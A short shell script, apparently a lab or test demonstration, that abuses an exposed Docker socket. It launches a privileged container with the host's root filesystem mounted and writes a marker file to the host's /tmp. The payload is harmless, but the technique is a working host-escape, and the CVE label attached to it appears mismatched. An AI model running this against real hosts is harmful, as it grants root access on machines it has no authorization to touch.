#!/bin/sh
# Simple demonstration script that tries to abuse the Docker daemon
# exposed via the host socket to spin up a privileged container on the host.
# This mimics the conditions required to trigger CVE-2021-40822.

# Wait for Docker daemon to be ready
while ! docker info > /dev/null 2>&1; do
  echo "Waiting for Docker daemon..."
  sleep 1
done

echo "Docker daemon is ready. Attempting privileged container launch..."
# Launch a container that mounts the host's root filesystem and runs as privileged
# This would give the attacker root access on the host if CVE-2021-40822 is present.

docker run --rm -v /:/hostfs -it --privileged alpine sh -c "echo 'Simulated exploit of CVE-2021-40822' > /hostfs/tmp/cve_exploit_success.txt"

echo "Exploit attempt finished. Check /tmp/cve_exploit_success.txt on the host for evidence."

# Keep the container running to allow manual testing
sleep infinity